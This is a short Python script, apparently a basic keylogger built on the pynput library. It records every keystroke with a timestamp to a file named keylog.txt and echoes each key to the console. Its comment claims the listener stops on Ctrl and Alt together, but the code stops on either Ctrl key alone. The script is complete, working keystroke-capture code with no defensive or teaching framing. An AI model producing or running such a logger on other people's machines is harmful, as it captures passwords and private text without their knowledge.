from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")

def on_press(key):
    key_str = str(key)
    print("Pressed key:", key_str)
    logging.info(key_str)
    
    # Check if Ctrl and Alt keys are pressed together to stop the listener
    if key == Key.ctrl_l or key == Key.ctrl_r:
        listener.stop()

with Listener(on_press=on_press) as listener:
    listener.join()
